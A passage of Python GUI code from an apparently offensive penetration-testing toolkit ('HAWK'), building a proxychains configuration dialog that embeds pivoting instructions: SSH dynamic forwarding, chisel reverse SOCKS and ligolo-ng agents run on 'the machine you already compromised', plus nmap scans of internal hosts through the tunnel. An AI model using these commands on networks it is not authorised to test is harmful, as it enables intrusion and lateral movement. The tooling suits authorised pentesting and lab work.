                 text=f"  Current ProxyList entry in {conf_path}:",
                 font=_f("sm", True), text_color=COLORS["text_dim"],
                 anchor="w").pack(fill="x", padx=10, pady=(6, 2))
    cur_lbl_text = (f"{cur_type}  {cur_ip}  {cur_port}"
                    if conf_content else "(file not found or empty)")
    if cur_port == "9050":
        cur_lbl_text += "   ⚠  pointing at Tor — change before using tools"
        cur_color = COLORS["text_yellow"]
    else:
        cur_color = COLORS["text_cyan"]
    ctk.CTkLabel(cur_frame,
                 text=f"  {cur_lbl_text}",
                 font=ctk.CTkFont(family="Courier New", size=13),
                 text_color=cur_color,
                 anchor="w").pack(fill="x", padx=10, pady=(0, 6))

    # ── SUGGESTED ─────────────────────────────────────────────────────
    sugg_frame = ctk.CTkFrame(body, fg_color=COLORS["bg_card"],
                              border_color=COLORS["border_green"],
                              border_width=2, corner_radius=6)
    sugg_frame.pack(fill="x", padx=16, pady=(4, 4))

    ctk.CTkLabel(sugg_frame,
                 text="  ⭐  SUGGESTED — Standard pivot proxy",
                 font=_f("sm", True), text_color=COLORS["text_green"],
                 anchor="w").pack(fill="x", padx=10, pady=(8, 4))

    sugg_val = ctk.CTkFrame(sugg_frame, fg_color=COLORS["bg_secondary"],
                            corner_radius=3)
    sugg_val.pack(fill="x", padx=10, pady=(0, 4))
    ctk.CTkLabel(sugg_val,
                 text="  socks5    127.0.0.1    1080",
                 font=ctk.CTkFont(family="Courier New", size=13),
                 text_color=COLORS["text_cyan"],
                 anchor="w").pack(fill="x", padx=8, pady=6)

    ctk.CTkLabel(sugg_frame,
                 text="  Compatible with: SSH -D 1080  ·  chisel R:socks  ·  ligolo-ng"
                      "  (all three create a SOCKS5 tunnel on local port 1080 by default)",
                 font=_f("xs"), text_color=COLORS["text_dim"],
                 anchor="w", wraplength=720, justify="left",
                 ).pack(fill="x", padx=10, pady=(0, 4))

    # StringVars — defined here so _use_suggested can reference them
    type_var = ctk.StringVar(value=cur_type)
    ip_var   = ctk.StringVar(value=cur_ip)
    port_var = ctk.StringVar(value=cur_port)

    def _use_suggested():
        type_var.set("socks5")
        ip_var.set("127.0.0.1")
        port_var.set("1080")
        # clear any stale warning — late-binding closure is fine here
        try:
            validation_lbl.configure(text="")
            _warned[0] = False
        except Exception:
            pass

    ctk.CTkButton(
        sugg_frame, text="USE SUGGESTED", width=150, height=26,
        font=_f("sm"), fg_color=COLORS["border_green"],
        hover_color=COLORS["bg_card_hover"],
        text_color=COLORS["bg_primary"], corner_radius=3,
        command=_use_suggested,
    ).pack(padx=10, pady=(0, 10), anchor="w")

    # ── Proxy editor ──────────────────────────────────────────────────
    edit_frame = ctk.CTkFrame(body, fg_color=COLORS["bg_card"],
                              border_color=COLORS["border_dim"],
                              border_width=1, corner_radius=4)
    edit_frame.pack(fill="x", padx=16, pady=4)
    ctk.CTkLabel(edit_frame, text="  Set new proxy:",
                 font=_f("sm", True), text_color=COLORS["text_bright"],
                 anchor="w").pack(fill="x", padx=10, pady=(8, 4))

    row = ctk.CTkFrame(edit_frame, fg_color="transparent")
    row.pack(fill="x", padx=10, pady=(0, 4))

    ctk.CTkLabel(row, text="Type:", width=50, anchor="w",
                 font=_f("sm"), text_color=COLORS["text_dim"]
                 ).pack(side="left")
    ctk.CTkOptionMenu(
        row, values=["socks5", "socks4", "http"],
        variable=type_var, width=100, height=28,
        font=_f("sm"), fg_color=COLORS["bg_secondary"],
        button_color=COLORS["bg_secondary"],
        button_hover_color=COLORS["bg_card_hover"],
        text_color=COLORS["text_bright"],
        dropdown_fg_color=COLORS["bg_card"],
        dropdown_text_color=COLORS["text_bright"],
    ).pack(side="left", padx=(0, 14))

    ctk.CTkLabel(row, text="IP:", width=30, anchor="w",
                 font=_f("sm"), text_color=COLORS["text_dim"]
                 ).pack(side="left")
    ctk.CTkEntry(row, textvariable=ip_var, width=160, height=28,
                 font=_f("sm"), fg_color=COLORS["bg_secondary"],
                 text_color=COLORS["text_bright"],
                 border_color=COLORS["border_dim"], border_width=1,
                 corner_radius=3).pack(side="left", padx=(0, 14))

    ctk.CTkLabel(row, text="Port:", width=40, anchor="w",
                 font=_f("sm"), text_color=COLORS["text_dim"]
                 ).pack(side="left")
    ctk.CTkEntry(row, textvariable=port_var, width=80, height=28,
                 font=_f("sm"), fg_color=COLORS["bg_secondary"],
                 text_color=COLORS["text_bright"],
                 border_color=COLORS["border_dim"], border_width=1,
                 corner_radius=3).pack(side="left")

    # Quick-fill presets
    preset_row = ctk.CTkFrame(edit_frame, fg_color="transparent")
    preset_row.pack(fill="x", padx=10, pady=(0, 8))
    ctk.CTkLabel(preset_row, text="Quick fill:",
                 font=_f("xs"), text_color=COLORS["text_muted"]
                 ).pack(side="left", padx=(0, 8))
    for _lbl, _pt, _pi, _pp in [
        ("SSH -D 1080", "socks5", "127.0.0.1", "1080"),
        ("chisel 1080", "socks5", "127.0.0.1", "1080"),
        ("ligolo 1080", "socks5", "127.0.0.1", "1080"),
        ("Tor (9050)",  "socks4", "127.0.0.1", "9050"),
    ]:
        def _fill(t=_pt, i=_pi, p=_pp):
            type_var.set(t); ip_var.set(i); port_var.set(p)
            try:
                _warned[0] = False
                validation_lbl.configure(text="")
            except Exception:
                pass
        ctk.CTkButton(
            preset_row, text=_lbl, width=110, height=22,
            font=_f("xs"), fg_color=COLORS["bg_card"],
            hover_color=COLORS["bg_card_hover"],
            border_color=COLORS["border_dim"], border_width=1,
            text_color=COLORS["text_dim"], corner_radius=3,
            command=_fill,
        ).pack(side="left", padx=(0, 4))

    # ── Inline validation label ────────────────────────────────────────
    validation_lbl = ctk.CTkLabel(body, text="", font=_f("sm"),
                                  text_color=COLORS["text_yellow"],
                                  anchor="w", wraplength=740,
                                  justify="left")
    validation_lbl.pack(fill="x", padx=20, pady=(2, 0))

    # ── HOW TO CREATE A TUNNEL ─────────────────────────────────────────
    _divider(body)
    ctk.CTkLabel(body,
                 text="  📡  HOW TO CREATE THE TUNNEL  "
                      "(run on Kali BEFORE setting the proxy above)",
                 font=_f("sm", True), text_color=COLORS["text_bright"],
                 anchor="w").pack(fill="x", padx=20, pady=(0, 6))

    _TUNNELS = [
        (
            "1 · SSH Dynamic  —  use when you can SSH directly into the pivot host",
            "ssh -D 1080 -f -N USERNAME@PIVOT_IP\n"
            "#             ^^^^^^^^  ^^^^^^^^^^\n"
            "#             SSH user  IP of the machine you already compromised\n"
            "# Example:  ssh -D 1080 -f -N john@10.10.10.5",
            "PREREQUISITE: you must already have valid SSH credentials (or a key) for\n"
            "the pivot host.  If you only have a shell (meterpreter, evil-winrm…) but\n"
            "NOT SSH access, use chisel instead.\n"
            "Flags: -D 1080 = open SOCKS5 on Kali port 1080,  -f = background,  -N = no command.\n"
            "Then set proxy above → socks5  127.0.0.1  1080",
        ),
        (
            "2 · chisel  —  use when SSH is unavailable; works with any shell (meterpreter, evil-winrm…)",
            "# ── Step 1 — On Kali, start the server:\n"
            "chisel server --port 9000 --reverse\n\n"
            "# ── Step 2 — On the pivot (Linux shell):\n"
            "chisel client KALI_IP:9000 R:socks\n"
            "# Replace KALI_IP with your tun0 address (ip a show tun0)\n\n"
            "# ── Step 2 — On the pivot (Windows shell):\n"
            "chisel.exe client KALI_IP:9000 R:socks\n"
            "# chisel.exe must be uploaded to the target first",
            "KALI_IP = your tun0/VPN IP visible from the pivot (run: ip a show tun0).\n"
            "chisel R:socks creates SOCKS5 automatically on Kali 127.0.0.1:1080.\n"
            "Download chisel.exe from LATERAL MOVEMENT → Chisel (Windows, download).\n"
            "Then set proxy above → socks5  127.0.0.1  1080",
        ),
        (
            "3 · ligolo-ng  —  transparent TUN routing; tools work WITHOUT proxychains after setup",
            "# ── Step 1 — On Kali, start the proxy listener:\n"
            "sudo ./ligolo-proxy -selfcert -laddr 0.0.0.0:11601\n\n"
            "# ── Step 2 — On the pivot, connect the agent:\n"
            "./ligolo-agent -connect KALI_IP:11601 -ignore-cert\n"
            "# KALI_IP = your tun0 address (ip a show tun0)\n\n"
            "# ── Step 3 — In the ligolo-ng console (back on Kali):\n"
            "session                                  # select the pivot\n"
            "start                                    # bring up the TUN interface\n"
            "sudo ip route add PIVOT_SUBNET/24 dev ligolo\n"
            "# PIVOT_SUBNET = internal network you want to reach (e.g. 192.168.1.0)",
            "After setup, nmap/curl/etc. reach the internal network DIRECTLY — no proxychains needed.\n"
            "proxychains is only needed if a specific tool requires a SOCKS endpoint.\n"
            "KALI_IP = your tun0/VPN IP.  PIVOT_SUBNET = the internal range behind the pivot.\n"
            "If used as SOCKS → socks5  127.0.0.1  1080",
        ),
    ]

    for _tname, _tcmd, _tnote in _TUNNELS:
        tf = ctk.CTkFrame(body, fg_color=COLORS["bg_card"],
                          border_color=COLORS["border_dim"],
                          border_width=1, corner_radius=4)
        tf.pack(fill="x", padx=16, pady=3)
        ctk.CTkLabel(tf, text=f"  {_tname}",
                     font=_f("sm", True), text_color=COLORS["text_bright"],
                     anchor="w").pack(fill="x", padx=10, pady=(6, 2))
        _lines = _tcmd.count("\n") + 1
        _cmd_h = max(32, min(_lines * 18 + 10, 160))
        tbox = ctk.CTkTextbox(tf, height=_cmd_h,
                              font=ctk.CTkFont(family="Courier New", size=12),
                              fg_color=COLORS["bg_secondary"],
                              text_color=COLORS["text_cyan"],
                              border_color=COLORS["border_dim"], border_width=1,
                              corner_radius=3, wrap="none")
        tbox.pack(fill="x", padx=10, pady=(0, 4))
        tbox.insert("1.0", _tcmd)
        tbox.configure(state="disabled")
        try:
            tbox._hawk_bubble_wheel = True
            tbox._textbox._hawk_bubble_wheel = True
        except Exception:
            pass
        ctk.CTkLabel(tf, text=f"  ℹ  {_tnote}",
                     font=_f("xs"), text_color=COLORS["text_dim"],
                     wraplength=720, justify="left",
                     anchor="w").pack(fill="x", padx=10, pady=(0, 8))

    # ── VERIFY section ────────────────────────────────────────────────
    _divider(body)
    ctk.CTkLabel(body,
                 text="  ✅  VERIFY PROXYCHAINS IS WORKING  "
                      "(run from Kali terminal after setting the proxy)",
                 font=_f("sm", True), text_color=COLORS["text_bright"],
                 anchor="w").pack(fill="x", padx=20, pady=(0, 6))

    _CHECKS = [
        (
            "1 · Exit IP  —  confirm traffic exits from the pivot, not from Kali",
            "proxychains4 curl -s https://ifconfig.me && echo",
            "Expected output: the pivot host's public IP — NOT your Kali IP.\n"
            "If you see your own Kali IP → the tunnel is not routing traffic correctly.\n"
            "⚠  Do NOT use a browser (Firefox, Chrome…) — browsers bypass proxychains entirely.\n"
            "   This test is ONLY valid when run from the Kali terminal.",
        ),
        (
            "2 · Tunnel listening  —  confirm the local SOCKS port is actually open before anything else",
            "ss -tlnp | grep 1080",
            "Expected output: a line showing a process bound to 127.0.0.1:1080\n"
            "(the process will be 'ssh', 'chisel', or 'ligolo-proxy' depending on your method).\n"
            "If nothing appears → the tunnel process is NOT running.\n"
            "   SSH Dynamic:  re-run the ssh -D 1080 command\n"
            "   chisel:       restart chisel server on Kali + client on pivot\n"
            "   ligolo-ng:    check the proxy console for a connected session",
        ),
        (
            "3 · DNS leak  —  confirm DNS queries go through the tunnel, not Kali's resolver",
            "grep -i 'proxy_dns' /etc/proxychains4.conf",
            "Expected output: a line reading exactly 'proxy_dns' (no leading #).\n"
            "If the line is commented out or missing → DNS resolves on Kali directly,\n"
            "leaking your real IP on every hostname lookup even if TCP traffic is tunnelled.\n"
            "Fix: open /etc/proxychains4.conf and add 'proxy_dns' above the [ProxyList] section.",
        ),
        (
            "4 · Real pivot test  —  the definitive check: reach an internal host Kali cannot see",
            "proxychains4 nmap -sT -Pn -p 22,80,443,445 INTERNAL_IP\n"
            "# Replace INTERNAL_IP with an IP on the internal network behind the pivot\n"
            "# Example: proxychains4 nmap -sT -Pn -p 22,80,443 192.168.1.10",
            "Expected output: port scan results for a host that is normally unreachable from Kali.\n"
            "If you get open/closed ports → pivot is working correctly.\n"
            "If you get 'Host seems down' or all filtered → check the IP and that the tunnel is up.\n"
            "-sT (TCP connect) and -Pn are MANDATORY: proxychains cannot forward ICMP or raw IP.\n"
            "INTERNAL_IP = any host on the network behind the pivot (not the pivot itself).",
        ),
    ]

    for _cname, _ccmd, _cnote in _CHECKS:
        cf = ctk.CTkFrame(body, fg_color=COLORS["bg_card"],
                          border_color=COLORS["border_dim"],
                          border_width=1, corner_radius=4)
        cf.pack(fill="x", padx=16, pady=3)
        ctk.CTkLabel(cf, text=f"  {_cname}",
                     font=_f("sm", True), text_color=COLORS["text_bright"],
                     anchor="w").pack(fill="x", padx=10, pady=(6, 2))
        cbox = ctk.CTkTextbox(cf, height=32,
                              font=ctk.CTkFont(family="Courier New", size=12),
                              fg_color=COLORS["bg_secondary"],
                              text_color=COLORS["text_cyan"],
                              border_color=COLORS["border_dim"], border_width=1,
                              corner_radius=3, wrap="none")
        cbox.pack(fill="x", padx=10, pady=(0, 4))
        cbox.insert("1.0", _ccmd)
        cbox.configure(state="disabled")
        try:
            cbox._hawk_bubble_wheel = True
            cbox._textbox._hawk_bubble_wheel = True
        except Exception:
            pass
        ctk.CTkLabel(cf, text=f"  ℹ  {_cnote}",
                     font=_f("xs"), text_color=COLORS["text_dim"],
                     wraplength=720, justify="left",
                     anchor="w").pack(fill="x", padx=10, pady=(0, 8))

    # ── Status label (fixed, outside scrollable) ───────────────────────
    status_lbl = ctk.CTkLabel(win, text="", font=_f("sm"),
                               text_color=COLORS["text_green"], anchor="w")
    status_lbl.pack(fill="x", padx=20, pady=(6, 2))

    # ── _warned flag — soft warnings require a second click to confirm ─
    _warned = [False]

    def _reset_warned(*_):
        _warned[0] = False
        try:
            validation_lbl.configure(text="")
        except Exception:
            pass

    type_var.trace_add("write", _reset_warned)
    ip_var.trace_add("write",   _reset_warned)
    port_var.trace_add("write", _reset_warned)

    def _set_proxy():
        ptype = type_var.get().strip()
        ip    = ip_var.get().strip()
        port  = port_var.get().strip()

        # ── Hard validation (always blocks) ───────────────────────────
        if not ip:
            validation_lbl.configure(
                text="  ⚠  IP address is required.",
                text_color=COLORS["text_red"])
            return
        if not port:
            validation_lbl.configure(
                text="  ⚠  Port number is required.",
                text_color=COLORS["text_red"])
            return
        try:
            port_int = int(port)
        except ValueError:
            validation_lbl.configure(
                text="  ⚠  Port must be a number (e.g. 1080).",
                text_color=COLORS["text_red"])
            return
        if not (1 <= port_int <= 65535):
            validation_lbl.configure(
                text=f"  ⚠  Port {port} is out of range — must be 1–65535.",
                text_color=COLORS["text_red"])
            return

        # ── Soft warnings — show once, require a second click ─────────
        soft_warns = []
        if port_int == 9050:
            soft_warns.append(
                "Port 9050 is the Tor default — if you are NOT using Tor "
                "this is almost certainly wrong.  "
                "SSH/chisel/ligolo-ng all use 1080 by default.")
        if ptype == "http":
            soft_warns.append(
                "HTTP proxy selected.  proxychains nmap (and most HAWK tools) "
                "require SOCKS4/5 — HTTP CONNECT proxies are NOT compatible.  "
                "Use socks5 unless you specifically have an HTTP proxy.")

        if soft_warns and not _warned[0]:
            _warned[0] = True
            msg = "\n  ⚠  ".join(soft_warns)
            validation_lbl.configure(
                text=f"  ⚠  {msg}\n  → Click SET PROXY again to confirm anyway.",
                text_color=COLORS["text_yellow"])
            return

        # Confirmed — clear warning and proceed
        validation_lbl.configure(text="")
        _warned[0] = False

        new_content = _build_new_content(conf_content, ptype, ip, port)
        backup = conf_path + ".hawk_backup"

        # ── Direct write (Kali is typically run as root) ───────────────
        try:
            if conf_content:
                with open(backup, "w", encoding="utf-8") as fh:
                    fh.write(conf_content)
            with open(conf_path, "w", encoding="utf-8") as fh:
                fh.write(new_content)
            status_lbl.configure(
                text=f"  ✓  Saved.  Backup: {backup}",
                text_color=COLORS["text_green"])
            try:
                if app:
                    app.terminal.write(
                        f"  [+] proxychains4.conf updated → "
                        f"{ptype} {ip}:{port}  "
                        f"(backup: {backup})", "success")
            except Exception:
                pass
            if on_save:
                try:
                    on_save()
                except Exception:
                    pass
            return
        except PermissionError:
            pass  # fall through to sudo path

        # ── Sudo path — write to /tmp, then sudo mv via xterm ─────────
        # Using repr() or printf with multi-line Python strings inside
        # a shell command is unreliable (escaping hell).  Instead, write
        # the content to a temp file from Python (no privileges needed)
        # and let the xterm run a simple `sudo mv` — two short commands
        # that survive any quoting in the conf file.
        _os.makedirs(TMP_DIR, exist_ok=True)
        tmp_path = _os.path.join(TMP_DIR, "hawk_proxychains_tmp.conf")
        try:
            with open(tmp_path, "w", encoding="utf-8") as fh:
                fh.write(new_content)
        except Exception as te:
            status_lbl.configure(
                text=f"  ⚠  Cannot write temp file: {te}",
                text_color=COLORS["text_red"])
            return

        cmd = (
            f"echo '[HAWK] Applying proxychains config (sudo required)...'; "
            f"cp {_shlex.quote(conf_path)} {_shlex.quote(backup)} 2>/dev/null; "
            f"sudo mv {_shlex.quote(tmp_path)} {_shlex.quote(conf_path)} && "
            f"echo '[HAWK] ✓ Config written to {conf_path}' || "
            f"echo '[HAWK] ✗ sudo mv failed — check permissions'; "
            f"echo ''; read -p 'Press ENTER to close...'"
        )
        from utils.runner import _open_terminal
        ok = _open_terminal("HAWK — sudo proxychains config", cmd)
        if ok:
            status_lbl.configure(
                text="  ℹ  Root required — a terminal opened for sudo.  "
                     "Close it when done, then reopen this dialog to verify.",
                text_color=COLORS["text_yellow"])
            # Fire on_save after a delay so xterm has time to finish
            if on_save:
                try:
                    win.after(5000, on_save)
                except Exception:
                    pass
        else:
            status_lbl.configure(
                text=f"  ⚠  No xterm available.  Run manually:  "
                     f"sudo mv {tmp_path} {conf_path}",
                text_color=COLORS["text_red"])

    btn_row = _btn_row(win)
    _btn(btn_row, "✏  SET PROXY", _set_proxy, primary=True, w=160)
    _btn(btn_row, "CLOSE", lambda: _safe_destroy(win), w=100)


__all__ = ['HashCrackDialog', 'NoPortsFoundDialog', 'QuickServiceProbeDialog', 'BackgroundJobDialog', 'show_crack_strategy_dialog', 'show_target_profile_dialog', 'show_online_crack_dialog', 'show_api_key_prompt', 'show_crack_progress_dialog', 'show_proxychains_config_dialog']
